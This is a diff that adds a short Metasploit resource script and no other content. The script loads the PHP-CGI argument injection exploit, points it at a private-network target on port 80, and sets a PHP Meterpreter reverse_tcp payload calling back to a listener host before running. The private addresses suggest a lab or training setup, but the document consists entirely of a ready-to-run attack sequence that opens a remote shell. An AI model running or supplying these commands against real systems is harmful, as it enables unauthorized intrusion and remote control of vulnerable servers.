@@ -1,0 +1,6 @@
+use exploit/multi/http/php_cgi_arg_injection
+set RHOST 192.168.49.138
+set RPORT 80
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.49.11
+run
